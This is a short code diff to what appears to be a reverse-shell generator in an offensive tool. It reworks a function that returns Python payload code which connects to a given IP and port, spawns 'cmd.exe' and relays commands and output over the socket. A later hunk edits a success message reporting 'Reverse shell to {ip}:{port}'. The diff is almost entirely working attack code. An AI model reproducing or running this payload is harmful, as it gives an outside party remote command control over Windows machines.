@@ -89,30 +89,37 @@ if ($type == True){
 
 def get_reverse_python(ip, port):
     if is_windows():
-        return """from socket import *
-import subprocess
-import threading
+        return """from socket import socket, AF_INET, SOCK_STREAM
+from subprocess import PIPE, Popen
+from threading import Thread
+from io import open as ioopen
+
 def send(client, proc):
+    f = ioopen(proc.stdout.fileno(), 'rb', closefd=False)
     while True:
-        msg = proc.stdout.readline()
+        msg = f.read1(1024)
+        if len(msg) == 0: break
         client.send(msg)
 def send2(client, proc):
+    f = ioopen(proc.stderr.fileno(), 'rb', closefd=False)
     while True:
         msg = proc.stderr.readline()
+        if len(msg) == 0: break
         client.send(msg)
 client = socket(AF_INET, SOCK_STREAM)
 addr = ('%s', %s)
 client.connect(addr)
-proc = subprocess.Popen('cmd.exe /K',stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True)
-t = threading.Thread(target=send, args=(client, proc))
+proc = Popen('cmd.exe /K',stdin=PIPE,stdout=PIPE,stderr=PIPE,shell=True, bufsize=1)
+t = Thread(target=send, args=(client, proc))
 t.setDaemon(True)
 t.start()
-t = threading.Thread(target=send2, args=(client, proc))
+t = Thread(target=send2, args=(client, proc))
 t.setDaemon(True)
 t.start()
 while True:
-    cmd = client.recv(1024)
-    proc.stdin.write(cmd)
+    msg = client.recv(1024)
+    if len(msg) == 0: break
+    proc.stdin.write(msg)
     proc.stdin.flush()""" % (
             ip,
             port,
@@ -175,6 +182,6 @@ def run(ip: str, port: str, reverse_type: str = "php"):
         return
     sleep(1)
     if (t.isAlive()):
-        print(f"\nReverse shell to  {ip}:{port} {color.green('success')}.\n")
+        print(f"\nReverse shell to {ip}:{port} {color.green('success')}.\n")
     else:
         print(f"\nReverse shell {color.red('error')}.\n")
